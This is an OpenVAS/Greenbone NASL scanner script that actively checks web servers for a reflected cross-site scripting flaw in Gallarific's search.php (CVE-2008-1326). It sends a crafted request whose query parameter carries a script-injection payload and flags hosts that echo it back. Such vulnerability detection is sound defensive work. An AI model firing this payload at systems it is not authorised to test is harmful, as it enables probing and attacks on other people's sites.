# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100309");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2009-10-20 18:54:22 +0200 (Tue, 20 Oct 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2008-1326");

  script_tag(name:"qod", value:"50"); # No extra check, prone to false positives and doesn't match existing qod_types

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Gallarific Multiple Vulnerabilities (Oct 2009) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Gallarific is prone to a cross-site scripting (XSS)
  vulnerability and multiple authentication bypass vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site, steal
  cookie-based authentication credentials, add new categories, add new users, and modify existing
  users. Other attacks are also possible.");

  script_tag(name:"affected", value:"These issues affect both the commercial and the free versions
  of Gallarific.");

  script_tag(name:"solution", value:"Updates are available. Please contact the vendor for
  details.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/28163");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/photos", "/gallery", http_cgi_dirs( port:port ) ) ) {
  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/search.php" );
  if( res !~ "^HTTP/1\.[01] 200")
    continue;

  url =  dir + '/search.php?dosearch=true&query="><script>alert(document.cookie)</script>';

  if( http_vuln_check( port:port, url:url, pattern:"<script>alert\(document\.cookie\)</script>",
                       check_header:TRUE, icase:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
